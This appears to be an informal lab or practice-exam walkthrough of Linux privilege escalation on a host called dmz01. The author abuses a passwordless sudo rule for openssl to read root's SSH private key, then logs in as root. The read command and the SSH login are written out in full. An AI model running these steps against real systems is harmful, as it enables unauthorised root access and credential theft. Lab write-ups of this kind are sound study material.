after we  access asa user `srvadm` and the creds we find it in the /var/logs 
```bash
sudo -l
Matching Defaults entries for srvadm on dmz01:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User srvadm may run the following commands on dmz01:
    (ALL) NOPASSWD: /usr/bin/openssl

```
so we can excute  /usr/bin/openssl as root with no password 
and we can use openssl to read any file as root in hte system 
let read the /root/.ssh/id_rsa to extrace the ssh privet ssh key and use it ot loign as root 
```shell-session
LFILE=/root/.ssh/id_rsa
 sudo /usr/bin/openssl enc -in $LFILE
```
copy the privet key content to our attack machine then use  it to login to target machine as root
```bash
─$ cat root_id_rsa        
-----BEGIN OPENSSH PRIVATE KEY-----

-----END OPENSSH PRIVATE KEY-----
╭─kali@kali ~/test_exam/dmz01 
╰─$ chmod 600 root_id_rsa  
```

```bash
 ssh root@10.129.229.147 -i root_id_rsa  
 <snip>           
root@dmz01:~# id
uid=0(root) gid=0(root) groups=0(root)              
```
we are root !!1